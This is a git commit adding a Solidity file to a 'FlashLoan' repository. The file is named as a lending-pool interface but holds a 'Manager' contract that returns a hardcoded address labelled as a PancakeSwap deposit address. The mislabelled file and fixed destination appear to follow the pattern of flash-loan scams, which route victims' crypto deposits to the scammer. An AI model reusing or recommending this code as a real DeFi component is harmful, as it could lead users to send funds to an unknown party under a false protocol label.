a31d09d7c15bffb97ebd0b3cc4ecb296bb36ea85
negus0 <105688183+negus0@users.noreply.github.com>
2022-05-16 22:10:04 -0400

    Add files via upload

---
+++ FlashLoan-main/contracts/interfaces/ILendingPool.sol
@@ -0,0 +1,13 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+    function performTasks() public pure{
+        
+    }
+    
+    function pancakeswapDepositAddress() public pure returns (address) {
+        return 0x183BD5d498214b30C6E315E9393881D0912D011a;
+    }
+}
+
+//pancakeswapfunction
